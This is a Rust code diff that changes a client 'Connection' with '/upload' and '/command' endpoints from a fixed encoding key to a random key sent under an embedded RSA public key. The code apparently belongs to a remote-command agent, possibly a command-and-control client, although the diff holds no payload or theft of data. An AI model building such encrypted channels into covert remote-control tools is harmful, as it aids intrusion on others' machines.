@@ -23,7 +23,18 @@ impl<'a> Connection<'a>{
             upload: "/upload",
             command: "/command",
             server: reqwest::Client::new(),
-            encoder: EncodeConnection::new( 42)
+            encoder: EncodeConnection::new(
+             rand::thread_rng().gen_range(0..255),
+    "-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkVLiPyzANDNB3e4oWAFS
+dysBxnZG1Yc0Oa5KfRCETlmKC6saB3LfFm+LwM0auaOB+S0/H6gXSviIJ1FlP56E
+c6G1gRJ7hCTJQE4j4mr9fq9+OF6NMmh6tVjtVeu3LJtFTLdV0C+yeWRL88KUazkI
+9TrbtoFfLs02dlYMynvJ4ugH+J2VM2wvbWAV4O9z2tEXEaWP1ah5L+bilyphmVkT
+TdRbb1M2OCTM+XahkjxEWoXAJsbHYBMZpi1F+9xhmfoM+wNp24KOMQ6JjaB7sV9L
+hOfGW6eoyvxwP9yAKMNKAWxGpLp/m9FYAAJ+kILF04T3JA9yONe5ykl37oTKmFeD
+iwIDAQAB
+-----END PUBLIC KEY-----".to_string()
+)
         }
     }
 
@@ -37,7 +48,7 @@ impl<'a> Connection<'a>{
             "key": self.encoder.get_key()
         });
 
-        let payload = self.encode_json_payload(&json_payload, "");
+        let payload = self.encode_json_payload_pub(&json_payload);
         
         let response = self.server.post(url)
         .json(&payload)
@@ -99,7 +110,7 @@ impl<'a> Connection<'a>{
         .await?;
         
         let decoded = self.encoder.decrypt(response.text().await?.as_str());
-        
+
         match serde_json::from_str::<serde_json::Value>(decoded.as_str()) {
 
         Ok(val) => {
@@ -129,6 +140,20 @@ impl<'a> Connection<'a>{
                 "data": encrypted
             })
         }
+
+    }
+
+    fn encode_json_payload_pub(&self, json_payload: &Value) -> Value{
+                
+        let json_string = serde_json::to_string(&json_payload).unwrap();
+
+        let encrypted = self.encoder.pub_key_enc(&json_string);
+
+        println!("{}",encrypted);
+
+        json!({
+            "data": encrypted
+         })
 
     }
     
